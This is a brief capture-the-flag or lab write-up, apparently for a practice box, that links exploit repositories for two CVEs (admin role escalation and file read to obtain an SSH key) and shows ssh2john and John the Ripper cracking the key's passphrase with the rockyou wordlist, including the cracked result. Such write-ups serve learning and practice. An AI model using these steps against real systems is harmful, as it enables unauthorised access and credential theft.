$ssh2john triviakey >> ssh.hash 

Lots to go over in this box 

https://github.com/Alien0ne/CVE-2025-2304 to get admin role

https://github.com/Goultarde/CVE-2024-46987 to read files and get trivia ssh key 

$ssh2john triviakey >> ssh.hash  to get a hash for john 

```
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (triviakey)     
1g 0:00:00:54 DONE (2026-04-29 23:06) 0.01821g/s 58.28p/s 58.28c/s 58.28C/s billy1..imissu
Use the "--show" option to display all of the cracked passwords reliably

```

